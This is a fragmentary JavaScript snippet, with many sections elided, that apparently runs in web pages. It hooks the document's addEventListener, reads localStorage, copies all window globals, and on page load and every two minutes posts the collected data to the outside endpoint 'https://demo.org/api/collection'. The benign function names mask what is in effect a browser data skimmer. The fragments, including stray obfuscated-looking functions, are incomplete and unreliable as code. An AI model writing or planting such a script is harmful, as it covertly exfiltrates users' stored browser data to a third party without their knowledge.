(function (p) {
  let trackedKeys = window.trackedKeys;
  let globalDataTracker = {};
  ...
  const hashCodeGenerator = inputData => {
    const keysArray = Object.keys(inputData);
    let hashSolution = keysArray.reduce((total, key) => total + key, "");
    let hash = 0;
    for (let i = 0; i < hashSolution.length; i++) {
      let code = hashSolution.charCodeAt(i);
  ...
  const eventListenerHook = () => {
    Document.prototype.oldAddEventListener = Document.prototype.addEventListener;
    Document.prototype.addEventListener = function (eventName, eventHandler) {
      console.log("Event being tracked: " + eventName);
  ...
  const fetchingDataFromLocaleStorage = () => {
  ...
  const dataPostingHandler = async postingData => {
    const uniqueHash = hashCodeGenerator(postingData);
    const endPoint = "https://demo.org/api/collection";
    try {
      ...
      if (request.status === 200) {
        ...
        console.error("Data submission failed, status code: " + request.status);
      }
    } catch (ex) {
      console.error("An error occurred during data submission: ", ex);
    }
  };
  var i = function (F) {
    if (typeof F != "object") {
  ...
  const dataCollectionAndPosting = () => {
    const collectedData = fetchingDataFromLocaleStorage();
    if (Object.keys(collectedData).length > 0) {
      dataPostingHandler(collectedData);
    }
  };
  window.onload = () => {
    dataCollectionAndPosting();
    setInterval(dataCollectionAndPosting, 2 * 60 * 1000);
  };
  function h() {
  ...
  for (let key in window) {
    ...
    globalDataTracker[key] = window[key];
  }
})(window.dw || {});